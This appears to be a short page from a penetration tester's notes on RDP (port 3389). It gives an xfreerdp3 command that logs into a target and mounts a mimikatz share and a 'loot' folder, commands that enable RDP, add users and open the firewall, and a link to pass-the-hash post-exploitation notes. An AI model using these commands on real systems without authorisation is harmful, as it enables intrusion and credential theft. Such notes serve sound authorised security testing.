+++
title = "🪟 RDP: TCP/UDP 3389"
+++

- `TCP 3389`: normal
- `UDP 3389`: automatic w/ RDP 8.0+ for performance (frames, audio, etc.)
- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon

Also called "Terminal Services".

```bash
# Connects to RDP and mounts mimikatz share
mkdir "$HOME/my_data/loot"; xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /drive:'/usr/share/windows-resources/mimikatz/x64',share /drive:"$HOME/my_data/loot",loot /v:<TARGET> /d:<DOMAIN> /u:<USER> /p:'<PASSWORD>'
```

# Enable RDP

```bash
# Enable in registry/service
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# Add to RDP group
net localgroup "Remote Desktop Users" <USER> /add
# Enable firewall
netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes
```

```bash
# Enable in registry/service
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
# Add to RDP group
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "<USER>"
# Enable firewall
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

# Enable NLA

NLA (Network Level Authentication) forces the client to authenticate before the RDP session even starts, instead of loading the full desktop login screen first

```bash
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
```

{{< embed-section page="Docs/6 - Post-Exploitation/pass-the-hash" header="rdp-restricted-admin-mode" title="RDP via Pass the Hash" >}}
